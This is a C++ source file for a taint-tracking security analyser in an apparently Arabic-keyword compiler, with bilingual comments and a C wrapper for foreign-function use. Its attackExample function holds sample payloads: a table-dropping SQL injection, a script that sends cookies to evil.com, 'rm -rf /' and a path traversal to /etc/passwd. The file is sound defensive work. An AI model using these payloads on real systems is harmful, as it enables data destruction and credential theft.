// ============================================================================
// taint_tracker.cpp — تنفيذ محرك تتبع التلوث
// (AR) منقول من compiler/src/security/taint_tracker.cpp إلى الطبقة المشتركة.
//      أُعيدت التسمية للإنجليزية وأُعيد تنظيم البنية باستخدام نمط Pimpl
//      لإخفاء التفاصيل الداخلية. تم الحفاظ على نفس السلوك الوظيفي والـ C ABI.
// (EN) Moved from compiler/src/security/taint_tracker.cpp to the shared layer.
//      Renamed to English identifiers, reorganized via Pimpl. Same functional
//      behavior and identical C ABI surface.
// ============================================================================

#include "taint_tracker.h"

#include <algorithm>
#include <climits>
#include <new>

namespace Sad {
namespace Security {
namespace Taint {

// ----------------------------------------------------------------------------
// (AR) TaintState
// (EN) TaintState
// ----------------------------------------------------------------------------

void TaintState::taint(const TaintMark& mark) {
    marks_.push_back(mark);
    tainted_ = true;
}

void TaintState::sanitizeFrom(SourceType source, const std::string& method) {
    marks_.erase(
        std::remove_if(marks_.begin(), marks_.end(),
                       [source](const TaintMark& m) { return m.source == source; }),
        marks_.end());
    if (marks_.empty()) {
        sanitized_ = true;
        sanitizationMethod_ = method;
    }
}

void TaintState::sanitizeAll(const std::string& method) {
    marks_.clear();
    tainted_ = false;
    sanitized_ = true;
    sanitizationMethod_ = method;
}

void TaintState::merge(const TaintState& other) {
    for (const auto& mark : other.marks_) marks_.push_back(mark);
    if (!other.marks_.empty()) tainted_ = true;
}

// ----------------------------------------------------------------------------
// (AR) SecurityWarning helpers
// (EN) SecurityWarning helpers
// ----------------------------------------------------------------------------

std::string SecurityWarning::sinkTypeName() const {
    switch (sink) {
        case SinkType::SqlQuery:    return "SQL Injection";
        case SinkType::Html:        return "XSS";
        case SinkType::SystemCmd:   return "Command Injection";
        case SinkType::FilePath:    return "Path Traversal";
        case SinkType::UrlRedirect: return "Open Redirect";
        case SinkType::Serialization: return "Insecure Deserialization";
        case SinkType::Eval:        return "Code Evaluation";
    }
    return "Security Issue";
}

// ----------------------------------------------------------------------------
// (AR) Impl: التفاصيل الداخلية لـ TaintTracker
// (EN) Impl: TaintTracker internals
// ----------------------------------------------------------------------------

struct TaintTracker::Impl {
    std::unordered_map<std::string, TaintState> states;
    std::unordered_set<std::string> sourceFunctions;
    std::unordered_set<std::string> sinkFunctions;
    std::vector<SecurityWarning> warnings;
    int nextId = 1;

    Impl() {
        initSources();
        initSinks();
    }

    void initSources() {
        // (AR) دوال قراءة الإدخال غير الموثوق
        // (EN) untrusted-input reading functions
        sourceFunctions.insert("اقرأ");
        sourceFunctions.insert("اقرأ_سطر");
        sourceFunctions.insert("اقرأ_ملف");
        sourceFunctions.insert("احصل_على_معامل");
        sourceFunctions.insert("احصل_على_رأس");
        sourceFunctions.insert("احصل_على_كوكي");
        sourceFunctions.insert("احصل_على_بيئة");
    }

    void initSinks() {
        sinkFunctions.insert("نفّذ_SQL");
        sinkFunctions.insert("استعلم");
        sinkFunctions.insert("raw_query");
        sinkFunctions.insert("اكتب_HTML");
        sinkFunctions.insert("عرض_قالب");
        sinkFunctions.insert("نفّذ");
        sinkFunctions.insert("shell");
        sinkFunctions.insert("system");
        sinkFunctions.insert("افتح_ملف");
        sinkFunctions.insert("اقرأ_ملف");
        sinkFunctions.insert("حوّل_إلى");
        sinkFunctions.insert("redirect");
    }

    static std::string sourceDescription(SourceType source) {
        switch (source) {
            case SourceType::UserInput:   return "إدخال المستخدم";
            case SourceType::Network:     return "بيانات الشبكة";
            case SourceType::File:        return "بيانات ملف";
            case SourceType::Database:    return "بيانات قاعدة البيانات";
            case SourceType::Environment: return "متغير بيئة";
            default:                      return "مصدر غير معروف";
        }
    }

    static Severity sinkSeverity(SinkType sink) {
        switch (sink) {
            case SinkType::SqlQuery:
            case SinkType::SystemCmd:
            case SinkType::Eval:
                return Severity::Critical;
            case SinkType::Html:
            case SinkType::FilePath:
                return Severity::High;
            case SinkType::UrlRedirect:
                return Severity::Medium;
            default:
                return Severity::Medium;
        }
    }

    static SinkType functionSinkType(const std::string& fn) {
        if (fn.find("SQL") != std::string::npos ||
            fn.find("استعلم") != std::string::npos) {
            return SinkType::SqlQuery;
        }
        if (fn.find("HTML") != std::string::npos) return SinkType::Html;
        if (fn.find("نفّذ") != std::string::npos ||
            fn.find("shell") != std::string::npos) {
            return SinkType::SystemCmd;
        }
        if (fn.find("ملف") != std::string::npos) return SinkType::FilePath;
        return SinkType::Html;
    }

    static std::string warningMessage(SinkType sink) {
        switch (sink) {
            case SinkType::SqlQuery:  return "SQL Injection: tainted data used in SQL query";
            case SinkType::Html:      return "XSS: tainted data rendered into HTML";
            case SinkType::SystemCmd: return "Command Injection: tainted data passed to system command";
            case SinkType::FilePath:  return "Path Traversal: tainted data used as file path";
            default:                  return "Potential security vulnerability";
        }
    }

    static std::string fixSuggestion(SinkType sink) {
        switch (sink) {
            case SinkType::SqlQuery:  return "Use parameterized queries (prepared statements)";
            case SinkType::Html:      return "Escape with sanitizeHTML() before rendering";
            case SinkType::SystemCmd: return "Avoid system commands or use a strict allowlist";
            case SinkType::FilePath:  return "Use sanitizePath() and isPathWithinDirectory()";
            default:                  return "Sanitize data before use";
        }
    }

    static std::string attackExample(SinkType sink) {
        switch (sink) {
            case SinkType::SqlQuery:  return "'; DROP TABLE users; --";
            case SinkType::Html:      return "<script>document.location='http://evil.com/'+document.cookie</script>";
            case SinkType::SystemCmd: return "; rm -rf /";
            case SinkType::FilePath:  return "../../../etc/passwd";
            default:                  return "";
        }
    }

    // (AR) تحقق ساكن لقاعدة تنقية معروفة (طريقة مناسبة لمصرف معين)
    // (EN) Static check for a known sanitizer rule (method-suitable-for-sink)
    static bool sanitizes(const std::string& method, SinkType forSink) {
        struct Rule { const char* method; SinkType sink; };
        static const Rule rules[] = {
            {"استعلام_آمن", SinkType::SqlQuery},
            {"هروب_SQL",    SinkType::SqlQuery},
            {"هروب_HTML",   SinkType::Html},
            {"تنقية_HTML",  SinkType::Html},
            {"هروب_shell",  SinkType::SystemCmd},
            {"تطبيع_مسار",  SinkType::FilePath},
            {"تحقق_مسار",   SinkType::FilePath},
        };
        for (const auto& r : rules) {
            if (r.sink == forSink && method == r.method) return true;
        }
        return false;
    }
};

// ----------------------------------------------------------------------------
// (AR) TaintTracker (واجهة Pimpl)
// (EN) TaintTracker (Pimpl forwarding)
// ----------------------------------------------------------------------------

TaintTracker::TaintTracker() : impl_(std::make_unique<Impl>()) {}
TaintTracker::~TaintTracker() = default;

void TaintTracker::taint(const std::string& variable, SourceType source,
                         const std::string& location) {
    TaintMark mark;
    mark.source = source;
    mark.id = impl_->nextId++;
    mark.sourceLocation = location;
    mark.description = Impl::sourceDescription(source);
    impl_->states[variable].taint(mark);
}

void TaintTracker::propagate(const std::string& from, const std::string& to) {
    auto it = impl_->states.find(from);
    if (it != impl_->states.end() && it->second.isTainted()) {
        impl_->states[to].merge(it->second);
    }
}

void TaintTracker::sanitize(const std::string& variable, const std::string& method,
                            SinkType forSink) {
    auto it = impl_->states.find(variable);
    if (it != impl_->states.end()) {
        if (Impl::sanitizes(method, forSink)) {
            it->second.sanitizeAll(method);
        }
    }
}

SecurityWarning* TaintTracker::checkSink(const std::string& variable, SinkType sink,
                                         const std::string& file, int line) {
    auto it = impl_->states.find(variable);
    if (it == impl_->states.end() || !it->second.isTainted()) {
        return nullptr;
    }

    SecurityWarning warn;
    warn.severity = Impl::sinkSeverity(sink);
    warn.sink = sink;
    warn.file = file;
    warn.line = line;
    warn.marks = it->second.marks();
    warn.message = Impl::warningMessage(sink);
    warn.fixSuggestion = Impl::fixSuggestion(sink);
    warn.attackExample = Impl::attackExample(sink);

    impl_->warnings.push_back(std::move(warn));
    return &impl_->warnings.back();
}

void TaintTracker::checkCall(const std::string& function,
                             const std::vector<std::string>& args,
                             const std::string& file, int line) {
    if (impl_->sinkFunctions.count(function)) {
        const SinkType sink = Impl::functionSinkType(function);
        for (const auto& arg : args) {
            checkSink(arg, sink, file, line);
        }
    }
}

const std::vector<SecurityWarning>& TaintTracker::warnings() const noexcept {
    return impl_->warnings;
}

bool TaintTracker::isTainted(const std::string& variable) const {
    auto it = impl_->states.find(variable);
    return it != impl_->states.end() && it->second.isTainted();
}

void TaintTracker::clear() {
    impl_->states.clear();
    impl_->warnings.clear();
}

}  // namespace Taint
}  // namespace Security
}  // namespace Sad

// ============================================================================
// (AR) C ABI: واجهة C للاستخدام عبر FFI
// (EN) C ABI: thin C wrapper for FFI use
// ============================================================================

using ::Sad::Security::Taint::SourceType;
using ::Sad::Security::Taint::TaintTracker;

extern "C" {

SadTaintTracker* sad_taint_tracker_create(void) {
    auto* tracker = new (std::nothrow) TaintTracker();
    return reinterpret_cast<SadTaintTracker*>(tracker);
}

void sad_taint_tracker_destroy(SadTaintTracker* tracker) {
    if (tracker) delete reinterpret_cast<TaintTracker*>(tracker);
}

void sad_taint_tracker_taint(SadTaintTracker* tracker, const char* variable,
                             int source_type, const char* location) {
    if (!tracker || !variable) return;
    if (source_type < 0 || source_type > 5) return;
    auto* impl = reinterpret_cast<TaintTracker*>(tracker);
    impl->taint(std::string(variable),
                static_cast<SourceType>(source_type),
                std::string(location ? location : ""));
}

int sad_taint_tracker_is_tainted(SadTaintTracker* tracker, const char* variable) {
    if (!tracker || !variable) return 0;
    try {
        return reinterpret_cast<TaintTracker*>(tracker)->isTainted(variable) ? 1 : 0;
    } catch (...) {
        return 0;
    }
}

int sad_taint_tracker_warning_count(SadTaintTracker* tracker) {
    if (!tracker) return 0;
    try {
        const std::size_t count =
            reinterpret_cast<TaintTracker*>(tracker)->warnings().size();
        return (count > static_cast<std::size_t>(INT_MAX))
                   ? INT_MAX
                   : static_cast<int>(count);
    } catch (...) {
        return 0;
    }
}

}  // extern "C"
